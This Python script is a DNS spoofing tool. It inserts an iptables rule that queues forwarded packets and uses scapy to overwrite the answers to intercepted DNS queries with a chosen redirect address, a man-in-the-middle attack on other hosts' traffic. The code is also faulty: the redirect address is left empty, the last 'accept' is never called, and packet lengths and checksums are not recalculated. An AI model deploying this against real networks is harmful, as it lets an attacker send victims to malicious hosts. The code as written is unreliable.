import os
import logging as log
from scapy.layers.inet import IP
from scapy.layers.dns import DNSRR, DNS, DNSQR
from netfilterqueue import NetfilterQueue


def dns_spoof(queue_number):
    net_queue = NetfilterQueue()
    os.system(f'iptables -I FORWARD -j NFQUEUE --queue-num {queue_number}')
    net_queue.bind(queue_number, evaluate_packet)

    try:
        net_queue.run()
    except KeyboardInterrupt:
        os.system(f'iptables -D FORWARD -j NFQUEUE --queue-num {queue_number}')


def evaluate_packet(queue_packet):
    packet_payload = queue_packet.get_payload()
    scapy_packet = IP(packet_payload)
    redirect_ip = ""

    if not scapy_packet.haslayer(DNSQR):
        queue_packet.accept()
    else:
        scapy_packet[DNS].an = DNSRR(rrname=scapy_packet[DNSQR].qname, rdata=redirect_ip)
        scapy_packet[DNS].ancount = 1
    queue_packet.set_payload(bytes(scapy_packet))
    queue_packet.accept


